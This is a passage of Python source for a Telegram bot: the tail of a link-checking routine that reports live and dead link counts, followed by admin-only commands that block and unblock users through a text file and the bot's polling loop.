        final_text = f"""📊 <b>✅ Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%\n━━━━━━━━━━━━━━━━━━\nDev: @I_PNP"""
        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except:
            safe_send_message(chat_id, final_text)
        if user_id in processing_status:
            del processing_status[user_id]
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")

@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_block} blocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")

@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")

print('✅ Bot is running with Ultimate Hybrid Engine & Response Tracker...')
try:
    bot.infinity_polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
except Exception as e:
    print(f'❌ Error: {e}')
